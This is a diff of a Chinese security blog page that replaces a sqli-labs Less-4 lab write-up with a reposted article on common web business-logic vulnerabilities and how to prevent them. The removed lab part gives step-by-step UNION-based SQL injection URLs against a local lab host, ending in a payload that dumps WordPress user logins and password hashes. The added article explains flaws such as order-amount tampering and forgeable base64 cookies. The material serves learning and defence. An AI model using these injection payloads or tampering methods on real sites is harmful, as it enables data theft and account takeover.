@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Sqli-4 | 大棟哥の博客</title>
+  <title>WEB安全测试中常见逻辑漏洞解析 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -263,47 +263,82 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2016-07-07T15:23:23.000Z" itemprop="datePublished">
-          2016-07-07
+      <time datetime="2016-12-28T05:22:14.000Z" itemprop="datePublished">
+          2016-12-28
       </time>
     
+    
+    | 
+    <a href='/tags/逻辑/'>逻辑</a>
+    
+    
 </span>
-                <h1>Sqli-4</h1>
+                <h1>WEB安全测试中常见逻辑漏洞解析</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>记录学习过程：<br>sqli-lab4<br>1.实验环境：centos上搭建的sqli实验环境，通过本机Firefox上的hackbar插件进行sql<br>注入类型：Union query<br>注入测试：<br>进入实验二界面：<br><a href="http://192.168.111.132/Less-4/" target="_blank" rel="external">http://192.168.111.132/Less-4/</a></p>
-<p><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>按照提示在后边加上参数：<br><a href="http://192.168.111.132/Less-4/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=1</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
-<p>判断注入：<br><a href="http://192.168.111.132/Less-4/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=1</a>“<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"></p>
-<p>将后边的注释之后，显示正常：<br><a href="http://192.168.111.132/Less-4/?id=1&quot;)--+" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=1&quot;)--+</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"></p>
-<p>order by之后有三个字段：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"></p>
-<p>查找显示位：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,2,3–+<br>有两个显示位<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"></p>
-<p>通过显示位来进行信息获取：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),database()–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"></p>
-<p>接下来构造语句：<br>首先查询有多少个库：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),count(distinct+table_schema) from information_schema.tables –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"></p>
-<p>爆库名：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),group_concat(distinct+table_schema) from information_schema.tables –+<br>去重之后的数据库<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8710.png?raw=true" alt="image"></p>
-<p>爆某一库的表：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),group_concat(distinct+table_name) from information_schema.tables where table_schema=’wordpress’–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8711.png?raw=true" alt="image"></p>
-<p>爆完表爆字段：<br><a href="http://192.168.111.132/Less-4/" target="_blank" rel="external">http://192.168.111.132/Less-4/</a><br>?id=-1”) union select 1,version(),group_concat(distinct+column_name) from information_schema.columns where table_schema=’wordpress’ and table_name=’wp_users’–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8712.png?raw=true" alt="image"></p>
-<p>爆字段里边的内容：<br><a href="http://192.168.111.132/Less-4/" target="_blank" rel="external">http://192.168.111.132/Less-4/</a><br>?id=-1”) union select 1,version(),group_concat(ID,user_login,user_pass) from wordpress.wp_users–+<br>id 用户名和密码：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8713.png?raw=true" alt="image"></p>
-<p>game over<br>总结：<br>group_concat()函数是将爆出来的内容拼接为一行显示出来<br>特别注意的就是刚开始的时候寻找注入点的时候，需要闭合语句，闭合起来不太好闭合，其次就是先报错，然后在报错的基础上构造正确的语句，通过联合注入，获取最终结果！</p>
+      		<pre><code>逻辑漏洞挖掘一直是安全测试中“经久不衰”的话题。相比SQL注入、XSS漏洞等传统安全漏洞，现在的攻击者更倾向于利用业务逻辑层的应用安全问题，这类问题往往危害巨大，可能造成了企业的资产损失和名誉受损，并且传统的安全防御设备和措施收效甚微。今天漏洞盒子安全研究团队就与大家分享Web安全测试中逻辑漏洞的挖掘经验。
+</code></pre><h2 id="一：订单金额任意修改"><a href="#一：订单金额任意修改" class="headerlink" title="一：订单金额任意修改"></a>一：订单金额任意修改</h2><p>很多中小型的购物网站都存在这个漏洞。在提交订单的时候抓取数据包或者直接修改前端代码，然后对订单的金额任意修改。<br>如下图所示：<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\1.jpg" alt="image"><br><img src="\images\WEB安全测试中常见逻辑漏洞解析\2.jpg" alt="image"></p>
+<p>经常见到的参数大多为<br>    rmb<br>    amount<br>    cash<br>    fee<br>    value<br>    amount<br>    money<br>关于支付的逻辑漏洞这一块还有很多种思路，比如相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数等等。<br>1.订单需要多重效验，如下图所演示。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\3.png" alt="image"></p>
+<ol>
+<li>订单数值较大时需要人工审核订单信息，如下图所演示。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\4.png" alt="image"></li>
+<li>我只是提到两个非常简单的预防思路，第二个甚至还有一些不足之处。这里需要根据业务环境的不同总结出自己的预防方式，最好咨询专门的网络安全公司。<h2 id="二：验证码回传"><a href="#二：验证码回传" class="headerlink" title="二：验证码回传"></a>二：验证码回传</h2>这个漏洞主要是发生在前端验证处，并且经常发生的位置在于<br> 账号密码找回<br> 账号注册<br> 支付订单等<br>验证码主要发送途径<br> 邮箱邮件<br> 手机短信<br>其运行机制如下图所示：<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\5.png" alt="image"><br>黑客只需要抓取Response数据包便知道验证码是多少。<h3 id="预防思路"><a href="#预防思路" class="headerlink" title="预防思路"></a>预防思路</h3>1.response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\6.png" alt="image"><br>2.如果要进行前端验证的话也可以，但是需要进行加密。当然，这个流程图还有一些安全缺陷，需要根据公司业务的不同而进行更改。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\7.png" alt="image"><h2 id="三．未进行登陆凭证验证"><a href="#三．未进行登陆凭证验证" class="headerlink" title="三．未进行登陆凭证验证"></a>三．未进行登陆凭证验证</h2>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。<br>常见案例：</li>
+<li>某电商后台主页面，直接在管理员web路径后面输入main.php之类的即可进入。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\8.png" alt="image"></li>
+<li>某航空公司订单ID枚举<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\9.png" alt="image"></li>
+<li><p>某电子认证中心敏感文件下载<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\10.png" alt="image"><br>4.某站越权操作及缺陷，其主要原因是没对ID参数做cookie验证导致。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\11.png" alt="image"></p>
+</li>
+<li><p>实际上还有很多案例，这里就不一一例举了，但是他们都存在一个共同的特性，就是没有对用户的登陆凭证进行效验，如下图为例。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\12.png" alt="image"><br>###　预防思路<br>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证，如下图所示。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\13.png" alt="image"></p>
+<h2 id="四：接口无限制枚举"><a href="#四：接口无限制枚举" class="headerlink" title="四：接口无限制枚举"></a>四：接口无限制枚举</h2><p>有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击。<br>常见案例：</p>
+</li>
+<li>某电商登陆接口无验证导致撞库<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\14.png" alt="image"></li>
+<li>某招聘网验证码无限制枚举<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\15.png" alt="image"></li>
+<li>某快递公司优惠券枚举<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\16.png" alt="image"></li>
+<li>某电商会员卡卡号枚举<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\17.png" alt="image"></li>
+<li>某超市注册用户信息获取<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\18.png" alt="image"><h3 id="预防思路-1"><a href="#预防思路-1" class="headerlink" title="预防思路"></a>预防思路</h3></li>
+<li>在输入接口设置验证，如token，验证码等。<br> 如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。<br> 如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。</li>
+<li>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</li>
+<li>验证码请不要以短数字来甚至，最好是以字母加数字进行组合，并且验证码需要设定时间期限。</li>
+<li>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。</li>
+<li><p>以上这是部分个人建议，实际方案需要参考业务的具体情况。</p>
+<h2 id="五：cookie设计存在缺陷"><a href="#五：cookie设计存在缺陷" class="headerlink" title="五：cookie设计存在缺陷"></a>五：cookie设计存在缺陷</h2><p>这里需要对其详细的说一下。我们先一个一个来吧。</p>
+<ol>
+<li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举，如下图所示<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\19.png" alt="image"></li>
+</ol>
+</li>
+</ol>
+<p>根据上图，我们可以分析出，这家网站对于cookie的效验只单纯的采用了一组数字，并且数值为常量，不会改变，这样非常容易遭到黑客的枚举。甚至有一些网站做的更简单，直接以用户名，邮箱号或者用户ID等来作为cookie的判断标准。</p>
+<ol>
+<li>cookie设置存在被盗风险<br>有很多时候，如果一个用户的cookie被盗取，就算用户怎么修改账号和密码，那段cookie一样有效。详情可以参考《BlackHat（世界黑帽大会）官方APP出现两个逻辑漏洞》。<br>其原理如下：<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\20.png" alt="image"></li>
+</ol>
+<p>国内大部分厂商都不会把这个地方当作安全漏洞来处理，他们认为这个漏洞的利用条件是黑客必须要大批量获取到用户的cookie。虽然事实如此，但是这个也是一个安全隐患。<br>3.用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。<br>有一些厂商为了图方便，没有对用户的cookie做太多的加密工作，仅仅是单纯的做一个静态加密就完事了。我之前就碰到一个，可以为大家还原一下当时的场景。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\21.png" alt="image"><br>当时我看到cookie中有个access token参数，看到value后面是两个等号，习惯性的给丢去base64解码里面，发现解出来后是我的用户名。因此只要知道一个人的用户名就可以伪造对方的cookie，登陆他人账户。<br>4.还有多个案例不再做重复说明，大家可以深入研究一下cookie中的逻辑漏洞。但是cookie中的漏洞大多都是属于一个越权漏洞。越权漏洞又分为平行越权，垂直越权和交叉越权。<br>    平行越权：权限类型不变，权限ID改变<br>    垂直越权：权限ID不变，权限类型改变<br>    交叉越权：即改变ID，也改变权限<br>如下图所示：<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\22.png" alt="image"></p>
+<h3 id="预防思路-2"><a href="#预防思路-2" class="headerlink" title="预防思路"></a>预防思路</h3><p>1.cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。<br>2.用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。<br>3.用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。<br>4.cookie中设定session参数，以防cookie可以长时间生效。<br>5.还有很多方法，不再一一例举，请根据业务不同而思考。</p>
+<h2 id="六：找回密码存在设计缺陷"><a href="#六：找回密码存在设计缺陷" class="headerlink" title="六：找回密码存在设计缺陷"></a>六：找回密码存在设计缺陷</h2><p>1.auth设计缺陷<br>经常研究逻辑漏洞的人可能会对以下URL很熟悉<br><code>www.xxx.com/resetpassword.php?id=MD5</code></p>
+<p>用户修改密码时，邮箱中会收到一个含有auth的链接，在有效期内用户点击链接，即可进入重置密码环节。而大部分网站对于auth的生成都是采用rand()函数，那么这里就存在一个问题了，Windows环境下rand()最大值为32768，所以这个auth的值是可以被枚举的。<br>如下面这个代码可以对auth的值做一个字典。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\23.png" alt="image"><br>然后重置某个账号，并且对重置链接内的auth进行枚举<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\24.png" alt="image"><br>整个漏洞的运作的流程图如下：<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\25.png" alt="image"><br>2.对response做验证<br>这个漏洞经常出现在APP中，其主要原因是对于重置密码的的验证是看response数据包，由于之前的案例没有截图，只能画个流程图给大家演示一下。<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\26.png" alt="image"><br>3.《密码找回逻辑漏洞总结》这篇文章很全面的总结了密码找回漏洞的几个具体思路和分析，这里我就不再继续滚轮子了。</p>
+<h3 id="预防思路-3"><a href="#预防思路-3" class="headerlink" title="预防思路"></a>预防思路</h3><p>1.严格使用标准加密算法，并注意密钥管理。<br>2.在重置密码的链接上请带入多个安全的验证参数。</p>
+<h2 id="七：单纯读取内存值数据来当作用户凭证"><a href="#七：单纯读取内存值数据来当作用户凭证" class="headerlink" title="七：单纯读取内存值数据来当作用户凭证"></a>七：单纯读取内存值数据来当作用户凭证</h2><p>实际上这个应该算作一个软件的漏洞，但是因为和web服务器相关，所以也当作WEB的逻辑漏洞来处理了。最能当作例子是《腾讯QQ存在高危漏洞可读取并下载任意用户离线文件（泄漏敏感信息）》这个漏洞，但是我相信这种奇葩的漏洞不一定只有腾讯才有，只是还没人去检测罢了。<br>产生这个漏洞的主要原因是程序在确定一个用户的登陆凭证的时候主要是依靠内存值中的某个value来进行确认，而不是cookie。但是内存值是可以更改和查看的。其流程图如下：<br><img src="\images\WEB安全测试中常见逻辑漏洞解析\27.png" alt="image"></p>
+<h3 id="预防思路-4"><a href="#预防思路-4" class="headerlink" title="预防思路"></a>预防思路</h3><ol>
+<li>走服务器端的数据最好做cookie验证。</li>
+<li>我不反对直接在进程中确定用户的登陆凭证，但是请对进程进行保护，或者对进程中的value做加密处理。<br>以上见到的只是几个比较经典的和常见的逻辑漏洞，这些逻辑漏洞也是程序开发人员和安全检测人员需要留意的。<br><code>文章原创作者： ArthurKiller @漏洞盒子安全研究团队，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）</code></li>
+</ol>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2016/07/08/sqli-5/" style="float: left;">
-        ← Sqli-5
+    <a class="pull-left" href="/2017/02/27/编辑器漏洞/" style="float: left;">
+        ← 编辑器漏洞
     </a>
     
     
-    <a class="pull-right" href="/2016/07/06/sqli-3/">
-        Sqli-3 →
+    <a class="pull-right" href="/2016/12/17/预防CSRF/">
+        预防CSRF攻击 →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/07/07/sqli-4/" data-title="Sqli-4" data-url="http://www.jiadong.xin/2016/07/07/sqli-4/"></div>
+<div class="ds-thread" data-thread-key="2016/12/28/WEB安全测试中常见逻辑漏洞解析/" data-title="WEB安全测试中常见逻辑漏洞解析" data-url="http://www.jiadong.xin/2016/12/28/WEB安全测试中常见逻辑漏洞解析/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"dadongge"};
 (function() {
